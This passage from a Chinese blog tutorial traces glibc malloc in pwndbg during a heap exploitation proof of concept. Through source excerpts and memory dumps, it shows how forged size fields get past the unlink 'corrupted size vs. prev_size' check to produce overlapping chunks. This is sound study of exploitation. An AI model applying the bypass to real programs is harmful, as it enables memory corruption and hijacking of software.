!= <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				<span class="comment">//省略有关于largebin unlink的代码......</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了方便理解，单步步入 POC 的 b1 = malloc(0x500)：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620104477519-da36dab4-453c-499e-ba73-189ce230ff45.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u96c7a6b4&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2013.01.13.png&originHeight=1800&originWidth=2880&originalType=binary&size=405322&status=done&style=none&taskId=u030bd732-47b7-45d1-8d5d-9a894575511" alt="截屏2021-05-04 13.01.13.png"><br>如上图所示，现在 tcachebin、fastbin、smallbin、largebin 均为空，按照之前调试 malloc 的经验：</p>
<ol>
<li>向 tcachebin 申请</li>
<li>若 tcachebin 无法满足则向 fastbin 申请</li>
<li>fastbin 也不满足则向 smallbin 申请</li>
<li>smallbin 也无法满足要求则向 unsortedbin 申请，现在开始对 unsortedbin 中的所有 free chunk 进行整理。</li>
</ol>
<p>现在的状况就是 last_remainder 为 NULL，我们首先会对其中的 free chunk 进行解链整理，然后调试到此处：</p>
<blockquote>
<p>注意：此处的解链过程并未调用 unlink<br>其实在上面的第 4 步中省略了一些内容：<br>在整理 unsortedbin 中的 free chunk 时会首先判断当前 unsortedbin 中是否只有 last_remainder 并且当前要申请的堆块大小是否为 small chunk 且可以满足需要，如果是的话对 last_remainder 进行切割后返回；如果不成立则边整理边判断当前要整理的堆块大小是否恰好满足申请要求，如果恰好满足则直接返回；若之前的两个条件都不满足则会将 free chunk 放入 smallbin 或 largebin 中。</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620105965741-67c984c8-eb6e-4489-a232-b9261635b7a3.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u8dd022be&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2013.26.01.png&originHeight=1800&originWidth=2880&originalType=binary&size=451850&status=done&style=none&taskId=u72e7640e-26e6-4031-92fc-8de6733eb9a" alt="截屏2021-05-04 13.26.01.png">如上图所示，现在我们准备将 POC 中的 0x555555757760（b 堆块）链入到 largebin 中，链入之前的内存状况如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a00</span> <span class="meta">#b(待链入largebin中)</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span> <span class="meta">#unsortedbin指针不会被清空</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>链入的具体过程在这里不再详说，可以参考之前的文章；链入之后效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620106649134-ce9d4f00-e3a1-49ff-b3de-ba1452b9e7d7.png#clientId=u3c0ab4c2-3592-4&from=drop&id=uaac0b771&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2013.37.22.png&originHeight=678&originWidth=2746&originalType=binary&size=87659&status=done&style=none&taskId=u0bb72310-c3a0-4a9c-b4ae-574f65b915e" alt="截屏2021-05-04 13.37.22.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a00</span> <span class="meta">#b(free-largebin)</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dce210</span>	<span class="number">0x00007ffff7dce210</span> <span class="meta">#unsortedbin指针不会被清空</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000555555757760</span>	<span class="number">0x0000555555757760</span></span><br><span class="line">    			#fd_nextsize		#bk_nextsize</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>现在 unsortedbin 中没有堆块可整理了，跳出 while 循环（跳出整理阶段），现在开始向 largebin 中申请堆块，但是难受的是 largebin 中唯一一个 free chunk 大小为 0xa00，但是我们申请的大小为 0x510，因为<strong>此时</strong>对 largebin 的分配遵守“最适大小的分配算法”，因此不会对此堆块进行切割，此时标记 bit 之后会使用 binmap 进行遍历合适的堆块（如果未找到合适堆块，则会对其进行切割）：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620107631387-e88c9295-1212-45e5-9774-ff9957ed554c.png#clientId=u3c0ab4c2-3592-4&from=drop&id=ud9899482&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2013.53.45.png&originHeight=1800&originWidth=2880&originalType=binary&size=447159&status=done&style=none&taskId=u780ba47d-f92d-449e-b348-ad01abca359" alt="截屏2021-05-04 13.53.45.png"></p>
<blockquote>
<p>关于 binmap 的讲解可以看前面的内容</p>
</blockquote>
<p>经过一些遍历之后最终找到了 largebin 中的唯一一个堆块，接下来我们对其开始切割，注意，重点来了！！！<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620108377063-25020083-b977-4135-a288-1e1972dc7c9f.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u9ca73156&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2014.06.10.png&originHeight=746&originWidth=2748&originalType=binary&size=103328&status=done&style=none&taskId=ua9e8d279-8202-423b-8958-66000fcf28a" alt="截屏2021-05-04 14.06.10.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">          size = chunksize (victim); <span class="comment">//size==0xa00（注意victim的原大小为0xa10）</span></span><br><span class="line">						 <span class="comment">//nb==0x510</span></span><br><span class="line">          <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">          assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line">	<span class="comment">//largebin中的第一个堆块一定可以满足所要申请的大小</span></span><br><span class="line"></span><br><span class="line">          remainder_size = size - nb; <span class="comment">//计算切割后的大小：remainder_size==0x4f0</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* unlink */</span></span><br><span class="line">          unlink (av, victim, bck, fwd); <span class="comment">//对largebin中的进行解链</span></span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>注意这里的 unlink 的检查，这里省略了 largebin 的相关解链代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">        	<span class="comment">//chunksize(P)==0xa00 #不包括标志位</span></span><br><span class="line">        	<span class="comment">//prev_size (next_chunk(P))==0xa00</span></span><br><span class="line">        	<span class="comment">//绕过检查！！！</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))  <span class="comment">//检查双向链表的完整性</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">		<span class="comment">//这里的检查并没有什么用，因为我们并没有修改双向链表</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">            	<span class="comment">//对largebin的fd_nextsize和bk_nextsize进行检查</span></span><br><span class="line">				<span class="comment">//省略有关于largebin unlink的代码......</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br></pre></td></tr></table></figure>

<p>解链效果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a00</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dce210</span>	<span class="number">0x00007ffff7dce210</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000555555757760</span>	<span class="number">0x0000555555757760</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>接下来开始切割，如下代码会省略一些内容，只保留框架：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">					<span class="comment">//......</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span> <span class="comment">//开始切割</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb); <span class="comment">//remainder==0x555555757c70</span></span><br><span class="line">#############################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta">pwndbg&gt; x/800gx 0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a00</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dce210</span>	<span class="number">0x00007ffff7dce210</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000555555757760</span>	<span class="number">0x0000555555757760</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span> &lt;-在此切割（remainder==<span class="number">0x555555757c70</span>）</span><br><span class="line"><span class="number">0x555555757c80</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">##############################################################################</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) <span class="comment">//链入前检查unsortedbin双向链表的完整性</span></span><br><span class="line">		    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">				<span class="comment">//将切割后余下的堆块扔进unsortedbin中......</span></span><br><span class="line">#############################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta">pwndbg&gt; x/800gx 0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a00</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dce210</span>	<span class="number">0x00007ffff7dce210</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000555555757760</span>	<span class="number">0x0000555555757760</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span> &lt;-在此切割（remainder==<span class="number">0x555555757c70</span>）</span><br><span class="line"><span class="number">0x555555757c80</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">    			<span class="meta">#fd					#bk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555757c70</span> —▸ <span class="number">0x7ffff7dcdca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757c70</span> <span class="comment">/* &#x27;p|uUUU&#x27; */</span></span><br><span class="line">##############################################################################</span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb)) <span class="comment">//nb==0x510</span></span><br><span class="line">                    av-&gt;last_remainder = remainder; <span class="comment">//不会链入到last_remainder中</span></span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) <span class="comment">//remainder_size==0x4f0</span></span><br><span class="line">                    &#123; <span class="comment">//设置fd_nextsize和bk_nextsize</span></span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">#############################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta">pwndbg&gt; x/800gx 0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> &lt;-victim</span><br><span class="line">    							#原:<span class="number">0x0000000000000a00</span></span><br><span class="line">    							#set_head[victim]</span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dce210</span>	<span class="number">0x00007ffff7dce210</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000555555757760</span>	<span class="number">0x0000555555757760</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000004f1</span> &lt;-在此切割（remainder==<span class="number">0x555555757c70</span>）</span><br><span class="line">    							#原:<span class="number">0x0000000000000000</span></span><br><span class="line">    							#set_head[remainder]</span><br><span class="line"><span class="number">0x555555757c80</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">    			<span class="meta">#fd					#bk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x00000000000004f0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    		#原：<span class="number">0x0000000000000a00</span></span><br><span class="line">    		#set_foot[remainder]</span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555757c70</span> —▸ <span class="number">0x7ffff7dcdca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757c70</span> <span class="comment">/* &#x27;p|uUUU&#x27; */</span></span><br><span class="line">##############################################################################</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim); <span class="comment">//p==0x555555757770</span></span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p; <span class="comment">//返回申请到的堆块</span></span><br></pre></td></tr></table></figure>

<p>最终结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> #b1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dce210</span>	<span class="number">0x00007ffff7dce210</span> 